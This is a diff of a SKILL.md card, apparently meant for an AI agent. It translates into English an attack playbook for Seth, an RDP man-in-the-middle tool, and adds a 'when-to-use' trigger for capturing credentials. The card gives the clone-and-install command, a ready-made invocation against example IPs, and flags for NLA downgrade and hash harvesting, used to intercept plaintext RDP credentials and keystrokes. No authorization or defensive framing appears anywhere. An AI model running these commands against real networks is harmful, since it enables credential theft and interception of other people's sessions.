@@ -2,37 +2,39 @@
 name: seth-rdp-mitm
 description: "Seth: intercepts RDP plaintext credentials. Signals: MITM, mitm, RDP MITM, downgrade-only attack, hash harvesting."
 zh-signals: "Seth: RDP 明文凭据截获。信号:中间人,mitm,RDP 中间人,仅降级攻击,哈希收割。"
+when-to-use: >-
+  Use when performing an RDP man-in-the-middle attack to downgrade NLA and capture plaintext credentials or hashes from RDP sessions on the local network.
 ---
 
 # Seth
 
-- 攻击大类:C40 嗅探与中间人攻击
-- 上游仓库:https://github.com/SySS-Research/Seth
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
+- Upstream Repository: https://github.com/SySS-Research/Seth
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/SySS-Research/Seth && cd Seth && pip install -r requirements.txt
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./seth.sh eth0 10.0.0.5 10.0.0.6 3389` | RDP 中间人 |
-| `-j` | 仅降级攻击 |
-| `-h` | 哈希收割 |
+| `./seth.sh eth0 10.0.0.5 10.0.0.6 3389` | RDP man-in-the-middle |
+| `-j` | Downgrade-only attack |
+| `-h` | Hash harvesting |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### RDP 明文凭据截获
+### RDP plaintext credential interception
 
 ```bash
 ./seth.sh eth0 10.0.0.5 10.0.0.6 3389
-# 降级 NLA 抓明文+键盘记录
+# Downgrade NLA to capture plaintext and keylog
 ```
 
-## 注意事项
+## Notes
 
-SySS 出品 RDP 中间人,降 NLA+截凭据。
+RDP man-in-the-middle tool by SySS: downgrades NLA and intercepts credentials.
